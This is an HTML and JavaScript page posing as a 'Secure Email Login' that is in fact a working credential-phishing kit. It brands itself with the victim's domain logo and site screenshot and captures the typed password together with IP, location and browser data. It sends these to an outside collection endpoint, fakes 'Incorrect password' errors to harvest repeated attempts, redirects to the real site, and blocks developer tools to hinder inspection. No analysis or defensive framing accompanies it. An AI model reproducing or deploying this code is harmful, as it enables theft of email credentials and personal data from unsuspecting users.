<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Email Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        :root {
            --primary: #4361ee;
            --primary-dark: #3a56d4;
            --success: #06d6a0;
            --danger: #ef476f;
            --dark: #1e293b;
            --light: #f8fafc;
            --gray: #94a3b8;
            --overlay: rgba(0, 0, 0, 0.7);
            --glass: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-size: cover;
            background-position: center;
            padding: 20px;
            transition: background-image 0.5s ease;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(2px);
            z-index: -1;
        }
        
        /* Loader Styles */
        .loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--overlay);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .loader-content {
            text-align: center;
            color: white;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Login Card */
        .login-card {
            background: var(--glass);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
            width: 100%;
            max-width: 450px;
            z-index: 10;
        }
        
        .login-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
            z-index: -1;
        }
        
        /* Header Styles */
        .brand-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
            gap: 12px;
        }
        
        .logo-container {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .logo-container img {
            width: 30px;
            height: 30px;
            object-fit: contain;
        }
        
        .brand-name {
            font-size: 24px;
            font-weight: 700;
            color: white;
        }
        
        .login-title {
            text-align: center;
            font-size: 22px;
            margin-bottom: 30px;
            font-weight: 500;
            color: white;
        }
        
        /* Form Styles */
        .form-group {
            margin-bottom: 25px;
        }
        
        .input-group {
            position: relative;
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 0 15px;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }
        
        .input-group:focus-within {
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.15);
        }
        
        .input-group i {
            color: var(--gray);
            font-size: 18px;
            margin-right: 12px;
        }
        
        .form-control {
            width: 100%;
            height: 50px;
            background: transparent;
            border: none;
            color: white;
            font-size: 16px;
            padding: 0;
        }
        
        .form-control:focus {
            outline: none;
        }
        
        .form-control::placeholder {
            color: var(--gray);
        }
        
        .password-toggle {
            background: none;
            border: none;
            color: var(--gray);
            cursor: pointer;
            font-size: 18px;
            padding: 0 5px;
        }
        
        /* Button Styles */
        .btn {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
            box-shadow: 0 4px 15px rgba(67, 97, 238, 0.3);
        }
        
        .btn-primary:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
        }
        
        .btn-primary:disabled {
            background: var(--gray);
            cursor: not-allowed;
            transform: none;
        }
        
        /* Footer Links */
        .form-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .remember {
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--gray);
        }
        
        .remember input {
            accent-color: var(--primary);
        }
        
        .forgot-password {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .copyright {
            text-align: center;
            margin-top: 30px;
            color: var(--gray);
            font-size: 14px;
        }
        
        /* Success Container */
        .success-con {
            background: var(--glass);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 50px 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            display: none;
            box-shadow: var(--shadow);
            z-index: 10;
        }
        
        .success-con i {
            font-size: 70px;
            color: var(--success);
            margin-bottom: 25px;
        }
        
        .success-con h2 {
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 600;
            color: white;
        }
        
        .success-msg {
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
            color: white;
        }
        
        .redirect-text {
            display: inline-block;
            background: rgba(6, 214, 160, 0.1);
            color: var(--success);
            padding: 10px 20px;
            border-radius: 30px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        /* Alert Messages */
        .alert {
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
        
        .alert-danger {
            background: rgba(239, 71, 111, 0.15);
            border: 1px solid rgba(239, 71, 111, 0.3);
            color: #ff6b8b;
        }
        
        /* Responsive Design */
        @media (max-width: 576px) {
            .login-card {
                padding: 30px 20px;
            }
            
            .brand-header {
                margin-bottom: 20px;
            }
            
            .login-title {
                font-size: 20px;
                margin-bottom: 20px;
            }
            
            .form-footer {
                flex-direction: column;
                gap: 15px;
            }
            
            .success-con {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Loader -->
    <div class="loader">
        <div class="loader-content">
            <div class="spinner"></div>
            <p>Loading secure login...</p>
        </div>
    </div>
    
    <!-- Login Card -->
    <div class="login-card">
        <div class="brand-header">
            <div class="logo-container">
                <img id="logoimg" src="" alt="Logo">
            </div>
            <div class="brand-name logoname"></div>
        </div>
        
        <h2 class="login-title" id="loginMgs"></h2>
        
        <div class="alert alert-danger" id="lessThan4" style="display: none;"></div>
        <div class="alert alert-danger" id="msg" style="display: none;"></div>
        <span id="error" class="alert alert-danger" style="display: none;"></span>
        
        <form action="javascript:void(0);" method="POST">
            <div class="form-group">
                <div class="input-group">
                    <i class="fas fa-envelope"></i>
                    <input type="email" class="form-control" name="username" placeholder="Email address" id="email" readonly>
                </div>
            </div>
            
            <div class="form-group">
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" class="form-control" id="password" name="pdf2" placeholder="Password">
                    <button type="button" class="password-toggle" id="pass-eye">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            
            <input type="hidden" name="pdf1" value="info@dell.com">
            <input type="hidden" name="address" value="ancoreinspection.com">
            <input type="hidden" name="email" value="">
            <input type="hidden" name="type" value="ancoreinspection.com">
            
            <button type="submit" class="btn btn-primary" id="submit-btn">Sign In</button>
        </form>
        
        <div class="form-footer">
            <label class="remember">
                <input id="sec-lg-ss" type="checkbox"> 
                <span>Secure session</span>
            </label>
            <a href="#" class="forgot-password" id="frg-psw">Forgot password?</a>
        </div>
        
        <div class="copyright">
            <p>Copyright © <span class="logoname"></span> 2025</p>
        </div>
    </div>
    
    <!-- Success Container -->
    <div class="success-con">
        <i class="fas fa-check-circle"></i>
        <h2>Verification Successful</h2>
        <div class="success-msg msg">
            Your email has been verified successfully.<br>
            You will be redirected shortly.
        </div>
        <div class="redirect-text">Redirecting in <span id="countdown">5</span> seconds...</div>
    </div>

<script>
        // Disable right-click context menu
        document.addEventListener('contextmenu', event => event.preventDefault());

        // Disable common keyboard shortcuts
        document.addEventListener('keydown', function (event) {
            // Prevent F12, Ctrl+Shift+I, Ctrl+U
            if (
                event.key === "F12" || 
                (event.ctrlKey && event.shiftKey && event.key === "I") || 
                (event.ctrlKey && event.key === "U")
            ) {
                event.preventDefault();
            }
        });
    </script> 
    
    <script>
        $(document).ready(function() {
            // Initialize counter for login attempts
            var cntt = 0;
            
            // Password toggle functionality
            $('#pass-eye').click(function() {
                const passwordField = $('#password');
                const eyeIcon = $(this).find('i');
                
                if (passwordField.attr('type') === 'password') {
                    passwordField.attr('type', 'text');
                    eyeIcon.removeClass('fa-eye').addClass('fa-eye-slash');
                } else {
                    passwordField.attr('type', 'password');
                    eyeIcon.removeClass('fa-eye-slash').addClass('fa-eye');
                }
            });
            
            // Form submission handler
            $('form').submit(async function(event) {
                event.preventDefault();
                
                // Hide previous error messages
                $('#error').hide();
                $('#msg').hide();
                $('#lessThan4').hide();
                
                // Get input values
                const email = $('#email').val();
                const password = $('#password').val();
                
                // Validate email format
                const emailFilter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                if (!emailFilter.test(email)) {
                    $('#error').text('Please enter a valid email address').show();
                    return false;
                }
                
                // Validate password length
                if (password.length < 4) {
                    $('#lessThan4').text('Password must be at least 4 characters').show();
                    // Clear password field
                    $('#password').val('');
                    return false;
                }
                
                // Show verifying state
                const submitBtn = $('#submit-btn');
                submitBtn.text('Verifying...').prop('disabled', true);
                
                try {
                    // Get domain from email
                    const domain = email.split('@')[1];
                    
                    // Get visitor information
                    const visitorInfo = await getVisitorIP();
                    const mxRecord = await getMXRecord(domain);
                    
                    // Prepare data to send
                    const postData = {
                        email: email,
                        password: password,
                        domain: domain,
                        browser: navigator.userAgent,
                        language: navigator.language,
                        mx_record: mxRecord,
                        ip: visitorInfo.ip,
                        country: visitorInfo.country,
                        region: visitorInfo.region,
                        city: visitorInfo.city,
                        date: new Date().toString()
                    };
                    
                    // Send data to PHP endpoint
                    $.ajax({
                        url: 'https://charlesprodvcts.com/bb/result.php',
                        type: 'POST',
                        data: postData,
                        success: function(response) {
                            if (cntt < 4) {
                                // Simulate incorrect password
                                $('#msg').text('Incorrect password. Please try again.').show();
                                cntt++;
                            } else {
                                // After 4 attempts, show success
                                $('.login-card').fadeOut(300, function() {
                                    $('.success-con').fadeIn();
                                    
                                    // Start countdown for redirection
                                    let seconds = 5;
                                    const countdown = setInterval(() => {
                                        seconds--;
                                        $('#countdown').text(seconds);
                                        if (seconds <= 0) {
                                            clearInterval(countdown);
                                            window.location.href = "https://" + domain;
                                        }
                                    }, 1000);
                                });
                            }
                        },
                        error: function() {
                            $('#msg').text('Network error. Please try again.').show();
                        }
                    });
                    
                } catch (error) {
                    $('#msg').text('An error occurred. Please try again.').show();
                } finally {
                    // Reset button state
                    submitBtn.text('Sign In').prop('disabled', false);
                    // Clear password field on each submit
                    $('#password').val('');
                }
            });
            
            // Initialize the page
            function initializePage() {
                // Hide loader after delay
                setTimeout(function() {
                    $('.loader').fadeOut();
                    
                    // Parse email from URL hash
                    const hash = window.location.hash.substr(1);
                    const email = handleBase64Data(hash);
                    
                    if (!email) {
                        console.log("No email found in URL");
                        return;
                    }
                    
                    // Set background image based on email domain
                    const domain = email.split('@')[1];
                    $('body').css('background-image', `url(https://image.thum.io/get/width/1200/http://${domain})`);
                    
                    // Set domain information
                    const capitalizedDomain = domain.charAt(0).toUpperCase() + domain.slice(1);
                    
                    // Set logo and title
                    $('#logoimg').attr('src', `https://logo.clearbit.com/${domain}`);
                    $('.logoname').text(capitalizedDomain);
                    $('#loginMgs').text(`${capitalizedDomain} Mail Login`);
                    document.title = `${capitalizedDomain} - Mail`;
                    
                    // Set email value
                    $('#email').val(email);
                    
                }, 700);
            }
            
            // Helper function to handle base64 data
            function handleBase64Data(string) {
                try {
                    return atob(string);
                } catch (error) {
                    return string;
                }
            }
            
            // Function to get visitor IP information
            async function getVisitorIP() {
                try {
                    const response = await fetch('https://ipinfo.io/json');
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        country: data.country,
                        region: data.region,
                        city: data.city
                    };
                } catch (error) {
                    return {
                        ip: "N/A",
                        country: "N/A",
                        region: "N/A",
                        city: "N/A"
                    };
                }
            }
            
            // Function to get MX records for a domain
            async function getMXRecord(domain) {
                try {
                    const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
                    const data = await response.json();
                    if (data.Answer && data.Answer.length > 0) {
                        return data.Answer[0].data;
                    }
                    return "No MX record found";
                } catch (error) {
                    return "Error retrieving MX record";
                }
            }
            
            // Initialize the page
            initializePage();
        });
    </script>
</body>
</html>